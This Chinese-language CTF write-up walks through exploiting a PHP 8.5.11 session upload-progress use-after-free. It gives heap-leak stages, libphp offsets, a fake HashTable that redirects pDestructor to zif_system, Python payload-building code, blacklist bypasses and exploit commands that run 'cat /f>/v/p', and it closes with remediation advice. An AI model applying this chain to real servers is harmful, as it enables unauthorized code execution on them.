# MemTrace Writeup

> TPCTF 决赛 · Web · PHP 8.5.11 `session.upload_progress` use-after-free
> 最终 flag：`{{FLAG}}`（远程） / `{{FLAG}}`（本地复现）

---

## 0. 一句话总结

题目给了一条“客户端 → 规范化网关 gw.py → Apache prefork 单 worker + mod_php 8.5.11”的链路，flag 在容器 `/answers/flag`（`/f` 软链）。真正的考点是 **php2shell（CVE-2026-109618 / CVE-2026-109619）在 8.5.11 上的堆布局**：用 Set-Cookie 泄漏拿到 Zend MM chunk base 与 libphp base，再用 **nb 回收**方式把 167 字节 fake HashTable 精确落到 `chunk+0x7e0d8`，把 `pDestructor` 改成 `zif_system`，请求收尾析构悬垂数组时执行命令。网关丢 Cookie、过滤器黑名单都只是外围障碍。

---

## 1. 题目与交付物

`AUTHORED-ED4AE5F9.zip` 解压后：

```
memtrace/
├── README.txt
└── src/
    ├── Dockerfile
    ├── conf/hardening.ini
    ├── conf/prefork.conf
    ├── site/memtrace.conf
    ├── gateway/gw.py
    └── public/{index.php,info.php,healthz.php}
```

关键配置：

- `Dockerfile`：`FROM php:8.5.11-apache`；`COPY public/ /v/`；`chmod 1777 /v`；`ln -s /answers/flag /f`；`a2enmod rewrite`。
- `hardening.ini`：`memory_limit=16M`、`post_max_size=64M`、`upload_max_filesize=64M`、`session.save_path=/tmp`、`session.use_strict_mode=0`、`session.use_cookies=1`、`session.upload_progress.enabled=On`、`session.upload_progress.cleanup=On`、`display_errors=On`、`error_reporting=E_ALL`、`variables_order="GPCS"`。
- `prefork.conf`：`StartServers=1`、`MaxRequestWorkers=1`、`ServerLimit=1`、`KeepAlive Off` —— 单 worker，这一点对利用至关重要。
- `memtrace.conf`：`DocumentRoot /v`，RewriteCond 命中以下请求直接 403：
  - `Content-Type` 含 `boundary=SSSSSSSSSSSSSSSSS` / `boundary=BBBBBBBBBB` / `boundary=BNDRY12345`
  - `Cookie: PHPSESSID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`（32 个 a）
  - `User-Agent` 前缀 `php2shell`
- `gw.py`：只向下游转发 `Host`（固定 `apache:80`）、客户端 `Content-Type`、`Content-Length`（body 非空时）、`Connection: close`，**不转发 Cookie / UA / 其他头**；`putrequest(command, path)` 会拒绝 path 里的控制字符；`_filtered()` 自己再做一遍上述 boundary/cookie/UA 黑名单；支持 `Transfer-Encoding: chunked` 自行解码。

README 强调“交付源码与线上逐字节一致，台面没有其他隐藏组件”。

---

## 2. 信息收集

### 2.1 远程环境

平台实例（VPN）只暴露网关：

- 实例 `AUTHORED-ED4AE5F9`，service host `{{INSTANCE_HOST}}` → `172.16.164.2:80`
- 扫描 `172.16.164.0/24` 与目标全端口 1–10000：**只有 80 开放**，Apache 后端不可直连
- 响应带两个 `Server` 头：`BaseHTTP/0.6 Python/3.12.16`（gw.py）与 `Apache/2.4.69 (Debian)`，`Connection: close`

`/info.php` 暴露的运行参数（与交付 `hardening.ini` 一致）：

| 参数 | 值 |
|---|---|
| PHP | 8.5.11 · apache2handler · 64bit |
| memory_limit | 16M |
| post_max_size / upload_max_filesize | 64M / 64M |
| expose_php | 0 |
| display_errors / error_reporting | On / 30719 (E_ALL) |
| session.save_path / session.name | /tmp / PHPSESSID |
| session.use_strict_mode / use_cookies | 0 / 1 |
| session.upload_progress.enabled / cleanup | On / On |

### 2.2 网关丢 Cookie 的验证

在本地实例（交付源码构建，28080 直连 / 28081 网关）放一个打印 `$_SERVER` 的探针：

- 直连 28080 带 `Cookie: PHPSESSID=probe1234` → `{"cookie":"PHPSESSID=probe1234","ua":"curl/8.22.0","host":"127.0.0.1:28080"}`
- 同请求经 28081 → `{"cookie":"-","ua":"-","host":"apache:80"}`

确认网关确实不透传 Cookie。曾在 `Content-Type` 里用 obs-fold（`\r\n ` / `\r\n\t`）尝试头注入：Python `http.client` 放行，但 Apache 2.4.69 把续行折回 `Content-Type` 值，不产生新的 `Cookie` 头；裸 CR/LF、NUL、VT、FF 一律 400。**没有网关→Apache 的头注入面。**

### 2.3 关键转折：表单字段可以启动会话

`session.use_only_cookies=On`，`php_session_rfc1867_early_find_sid()` 里：

```c
if (PS(use_cookies)) {
    sapi_module.treat_data(PARSE_COOKIE, NULL, NULL);
    if (early_find_sid_in(TRACK_VARS_COOKIE, ...)) return;
}
if (PS(use_only_cookies)) return;   /* 才轮到 GET */
```

看起来 Cookie 丢了就没戏。但 rfc1867 的解析发生在 **RINIT 之前**，此时 `PS(use_only_cookies)` 被清零；`FORMDATA` 分支：

```c
if (!PS(use_only_cookies) &&
    zend_string_equals_cstr(PS(session_name), data->name, name_len)) {
    zval_ptr_dtor(&progress->sid);
    ZVAL_STRINGL(&progress->sid, ...);      /* 接受 PHPSESSID 表单字段 */
}
```

实测：`multipart` body 里放 `PHPSESSID` 字段 + `PHP_SESSION_UPLOAD_PROGRESS`，经网关发出，若 sid 非法（`abc/def`）响应里立刻出现：

```
<b>Warning</b>:  PHP Request Startup: Session ID is too long or contains illegal characters...
Failed to read session data: files (path: /tmp)
Failed to write session data (files)
```

而同样的非法 sid 放在 `Cookie` 里经网关则完全无警告。**结论：session id 走 body 的表单字段，网关路径完全可用。**

---

## 3. 漏洞原理：php2shell

### 3.1 两个 CVE

- **CVE-2026-109618**：OOM 时 `longjmp` 中断 multipart 解析 / HashTable 插入，留下半初始化状态。
- **CVE-2026-109619**：OOM 发生在请求启动/会话保存过程中时，`PG(modules_activated)==0` 会跳过 session 的 RSHUTDOWN，`PS(id)` / `PS(http_session_vars)` 指针悬垂到请求堆，被下一个同 worker 请求“继承”。

两条合起来：OOM 做“原语”，后续请求复用悬垂指针做“泄漏 / 劫持”。

### 3.2 泄漏点

`php_session_send_cookie()` 用 `php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)))` 构造 `Set-Cookie`。如果 `PS(id)` 指向被伪造/被复用的 `zend_string`，`len` 与 `ptr` 都由攻击者控制，`Set-Cookie` 就会把进程内存（含堆指针、libphp 指针）原样吐回来——**纯 HTTP、无 gdb、无 /proc 的 ASLR bypass**。

### 3.3 执行点

请求收尾 `zend_array_destroy` 会遍历 session 数组并调用 `pDestructor`。把悬垂的 session HashTable / reference 重占为伪造结构，`pDestructor` 写成 `zif_system`，参数写成命令字符串，即 RCE。

---

## 4. 三个 stage

以下偏移都基于本镜像 `php:8.5.11-apache`（libphp sha256 `2c80ca2a…`）：

```
zif_system     = 0x5996e0
zval_ptr_dtor  = 0x7b47a0
htdata (8.5.11)= 0x7e0d8   # chunk 相对
```

### stage 1：堆泄漏

1. 发一个 1001 字段 + `PHPSESSID=\x00` + `PHP_SESSION_UPLOAD_PROGRESS` + file + 12–18MB big 的 multipart，触发 OOM，让 `PS(id)` 悬垂。
2. 下一个请求用 `PHPSESSID=attacksessionid0001`，再用 841 个 48 字节字段把悬垂的 `zend_string` 重新占成 `len=0x1000` 的伪造串。
3. 响应 `Set-Cookie` 变成约 6.4KB，按 `v & ~0x1FFFFF` 分桶取众数 → **chunk base**（2MB 对齐）。

### stage 2：libphp 泄漏

1. 再次 OOM 让 `PS(id)` 悬垂。
2. 下一个请求用 983 个数组字段（其中一个 `a0406[]` 扩成 16 元素）把 56 字节 HashTable 落到 `PS(id)+0x18`，其 `pDestructor`（`zval_ptr_dtor`，libphp 指针）正好覆盖 `PS(id)` 的 `ptr`。
3. `Set-Cookie` 里读出 `zval_ptr_dtor` → 减去 `0x7b47a0` 得 **libphp base**。

### stage 3：8.5.11 的 nb 回收

这是本题真正的坑。8.4 的 9bie 方式（6 对 31B pad + 15B carrier + 15 个 167B fake HT，`htdata=0x690d8`）在交付配置下**几何对不上**：

- 交付配置 `expose_php=0` 时，悬垂 reference 的回收位点 `R0 = chunk+0x68160`；
- 15B carrier 只能落在 `chunk+0x61xxx`（到 `0x61f40` 后整段跳到 `0x751a8+`）；
- 两者之间是可分配空洞，按 `0x40/字段` 与 `0x50/字段` 的步长列同余方程 `8a−10b` 无解（区 1 差 3520 需要 b=352 已进区 2；区 2 差 6665 是奇数）。

逐项消元查过：不是 `memory_limit`（8M/16M 都试）、不是 `variables_order`（GPCS/EGPCS 都试）、不是页面内容（`/healthz.php` 也试）。同一台机器上只把 `expose_php` 改成 On，9bie 立刻成功——说明官方 pads 依赖 expose_php 带来的那个堆位偏移。

8.5.11 的正确做法是 **nb 回收**（live reference 重占）：

```python
def _live_ref(self, htdata):
    v = bytearray(b"R" * 31)
    struct.pack_into("<Q", v, 0, (10 << 32) | 1)   # IS_REFERENCE, refcount 1
    struct.pack_into("<Q", v, 8, htdata)           # 指向 fake HashTable
    struct.pack_into("<I", v, 0x10, 0x307)         # type_info
    struct.pack_into("<I", v, 0x14, 0)
    return bytes(v)
```

完整流程：

1. `rotate()`：用一个 1001 字段 + big 的请求打崩当前 worker，prefork 会 fork 一个干净子进程（同一父进程，ASLR base 不变）。
2. `_oom_arm_pads()`：`PHPSESSID=a*100` 表单字段 + `PHP_SESSION_UPLOAD_PROGRESS` + 107 个 1 字节 pad + file part + 12MB big，触发 OOM，让 `PS(http_session_vars)` 悬垂。
3. 攻击请求：
   - `PHPSESSID=a*100`（同一个 session id）+ `PHP_SESSION_UPLOAD_PROGRESS=pwn`
   - 8 个 `m%04d`（100B）
   - 80 个 31 字符 `F...`（1B）
   - **200 个 `r%04d`，值 = 上面 31 字节的 live ref**
   - 最后 1 个 `a000…` 字段，值 = 167 字节 fake HashTable

fake HashTable 布局（`htdata` 处）：

```c
+0x00  gc: refcount=1, type=IS_ARRAY(7)
+0x08  flags=0x10, nTableMask=0xFFFFFFF8
+0x10  arData = htdata+0x20        // 同时当 fake execute_data 用
+0x18  nNumUsed=1, nNumOfElements=1
+0x30  pDestructor = libphp + zif_system
+0x20  fake execute_data: call_info, ...
+0x40  ZEND_CALL_NUM_ARGS = 1
+0x70  arg1 = htdata+0x80          // fake zend_string 指针
+0x78  arg1 type = 6 (IS_STRING)
+0x80  fake zend_string: len, "cat /f>/v/p"
```

`200` 个 live ref 的作用是占满堆，使被释放的悬垂 reference 单元恰好被某个 31 字节 `r` 字段值重占；这个 31 字节结构把悬垂 zval 解释成 `IS_REFERENCE → htdata`，收尾析构时走到 fake HashTable 的 `pDestructor`，调用 `zif_system("cat /f>/v/p")`。

`htdata = chunk + 0x7e0d8`（8.5.11 profile）。命令最长为 14 字节（含结尾 NUL 的空间是 15，`MAX_CMD=14`）。

---

## 5. 绕过防线

| 防线 | 绕过 |
|---|---|
| 网关丢弃 Cookie | session id 走 multipart 的 `PHPSESSID` 表单字段 |
| `boundary=SSSSSSSSSSSSSSSSS` 403 | 改 `boundary=TTTTTTTTTTTTTTTTT`（17 个 T） |
| `boundary=BBBBBBBBBB` 403 | 改 `boundary=CCCCCCCCCC`（10 个 C） |
| `boundary=BNDRY12345` 403 | 改 `CNDRY12345` |
| `Cookie: PHPSESSID=32×a` 403 | 不用 Cookie；表单 sid 用 `a*100` / `attacksessionid0001` |
| `User-Agent: php2shell` 403 | 脚本默认 UA 是 Python-urllib，无需改 |
| 网关自身 `_filtered` | 同上，boundary/sid 都不命中 |
| 命令长度 14 字节 | `cat /f>/v/p`（11 字节），写入 1777 权限的 docroot，再 HTTP 读回 |

---

## 6. 复现步骤

### 6.1 本地交付源码实例

```bash
# 1) 基镜像：Docker Desktop 直连 registry 不通，用 daocloud 镜像打 tag
docker pull docker.m.daocloud.io/library/python:3.12-slim-bookworm
docker tag docker.m.daocloud.io/library/python:3.12-slim-bookworm python:3.12-slim-bookworm

# 2) 起 apache + gateway
cd memtrace/run
docker compose -p memtrace-run up -d --build
# apache  : 28080 -> 80  (挂 ./answers:/answers:ro)
# gateway : 28081 -> 80
```

验证：单 worker（连续请求 worker PID 不变）、`/info.php` 显示 16M / expose_php 0、直连与网关首页 200、过滤器 403 生效。

### 6.2 打远程

```bash
cd memtrace
NB_HUGE=12 python exp/nb8511.py \
  -u http://172.16.164.2/index.php \
  --version 8.5.11 --retries 3 \
  -c 'cat /f>/v/p'

curl http://172.16.164.2/p
# {{FLAG}}
```

### 6.3 打本地

```bash
python exp/nb8511.py \
  -u http://127.0.0.1:28080/index.php \
  --version 8.5.11 --container memtrace-run-apache --retries 2 \
  -c 'cat /f>/v/fl'

curl http://127.0.0.1:28080/fl
# {{FLAG}}
```

---

## 7. 踩坑记录

1. **`--retries 0` 的坑**：自研脚本 `for attempt in range(1, retries+1)`，`--retries 0` 时 stage1 一次都不跑，直接打印 `HEAP_LEAK_FAILED`。我一度据此误判“网关让链不可达”，走了很久弯路。改成 `--retries 2` 后经网关 stage1/2 立刻成功。
2. **网关丢 Cookie ≠ 链不可达**：rfc1867 在 RINIT 前把 `use_only_cookies` 清零，表单字段就是 session id 的投递通道。
3. **9bie 几何在 8.5.11/16M/expose_php=0 下无解**：gdb 量出 `R0=chunk+0x68160`，carrier 落 `0x61xxx`，中间是空洞；不是调 pads 能解决的。
4. **gdb 附加**：`-ex "set $cb=0x..."` 经 `sh -c` 会被展开；attach master + `set follow-fork-mode child` 时，`gdb.selected_inferior()` 要在 stop 回调里取，不能在 import 时缓存。
5. **`pkill -f "gdb -q -batch"`** 会把执行它的 `sh -c` 自己也匹配掉（exit 143），要用 `kill $(pgrep -f "[g]db -q -batch")`。
6. **Git-Bash**：`docker exec ... /v/...` 需 `MSYS_NO_PATHCONV=1`；`docker cp /tmp/x` 会把宿主 `/tmp` 映射成 `D:\tmp`，探针文件放工作区再 `docker cp`。
7. **sites-enabled**：Debian 的 `sites-enabled/000-default.conf` 是文件副本而非软链，改 vhost 要同时改 `sites-available` 与 `sites-enabled`。
8. **本地构建**：gateway 的 `FROM python:3.12-slim-bookworm` 在 Docker Desktop 上拉不到，先 daocloud 拉取再打官方 tag，不改交付 `src/`。

---

## 8. 修复建议

- PHP 升级到 8.5.12 / 8.4.27 / 8.3.30 / 8.2.29 及以上（上游修复：bailout 时清理会话状态）。
- 不依赖 upload progress 的场景直接 `session.upload_progress.enabled=0`。
- 网关只做“规范化”不够：应显式拒绝 multipart 里的 `PHPSESSID` 字段、限制字段数量/嵌套深度、限制 boundary 和总 body 大小。
- `memory_limit` 不要设得过小（16M 反而更容易被 OOM 原语利用）；`expose_php=0` 能挡住版本探测，但挡不住本链。

---

## 9. 参考

- [alvarodh5/php2shell](https://github.com/alvarodh5/php2shell) —— 8.5.11 单文件 in-band PoC（`s3=nb, htdata=0x7e0d8`）
- [php2shell-deep-dive](https://github.com/djad04/php2shell-deep-dive) —— 堆布局可视化与 8.4.26 逐步讲解
- [CVE-2026-109619 ANALYSIS](https://github.com/santihabib/CVE-2026-109619) —— 源码级分析
